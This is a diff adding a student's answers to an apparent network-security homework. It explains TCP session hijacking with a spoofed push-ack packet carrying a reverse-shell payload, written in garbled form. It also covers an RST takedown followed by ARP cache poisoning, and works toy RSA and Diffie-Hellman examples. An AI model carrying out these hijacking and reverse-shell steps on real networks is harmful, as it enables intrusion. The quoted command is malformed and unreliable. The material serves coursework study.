@@ -57,11 +57,83 @@ This could be a tcp syn scan trying to be performed on the server by an attacker
 Alice is the client
 Bob is server
 
+She wants to pretend to be alice and create a reverse shell to Bob, telling him to connect to a session in Trudy's computer.
 
+Trudy will need to create an ip/tcp packet that contains the malicious payload.
+
+For ip, she can use the ip source and destination ports (src is the client, alice, and dst is the server, bob).
+
+Then, from the last packet transmitted, she can also get the src port and dest ports (as above) + the last seen seq and ack numbers.
+
+The flag should be sent as PA (Push Ack)
+
+and a payload to create a reverse
+shell is layered in the data: (from lab, we did `/bin/bash -i > /alice/{aliceIP}/{alice listening port} + new line character"`)
+
+Finally, she can construct the packet and sen it as ip/tcp/payload
 ### B 
 It would definitely be useful since, if alice is taken down, trudy can now pretend to be alice and respond in her behalf.
-
+This is kind of a solution to the problem below.
+First she can send a rst attack to alice or find a way to take her system down.
+Afterwards, she can posion the arp cache to overwrite the ip-mac arp table such that alice segments will not reach bob and vice versa
+Finally, trudy can continue to communicate with bob whilst pretending to be alice (a much more persistent attack)
 ### C
 Trudy can continue guessing forever I think, it's just a matter of how hard it is to be guessing the seq and ack numbers.
 The difficulty in this instance does not come from the fact that you can get "banned" from the server.
 It comes from the fact that it's nearly impossible to actually guess those numbers (seq ack) right if you cannot see the packets
+
+## Q5
+p = 53, n = 2279 
+
+Choose too large prime numbers, p and q
+
+n = pq , phi is (p-1)(q-1)
+
+q -> 2279 = 53 x 43
+
+(43-1)(53-1)
+
+phi= 2,184
+
+p = 53
+q = 43
+n = 2279 
+$\phi$ = 2184
+
+e < $\phi$
+and e and phi are relatively prime
+
+e = 23
+
+find d 
+
+Public:
+2279, 23
+
+Private:
+2279, 95
+
+100^23 mod 2279 = 755
+
+755^95 mod 2279 = 100
+
+## Q6 
+
+g = 7
+n = 29
+a = 5
+b = 6
+
+A = g^a mod n
+A = 7^5 mod 29
+
+B = g^b mod n
+B = 7^6 mod 29
+
+K= A^b mod n
+K = B^a mod n
+
+K= 16^6 mod 29 = 20
+K = 25^5 mod 29 = 20
+
+## Q7
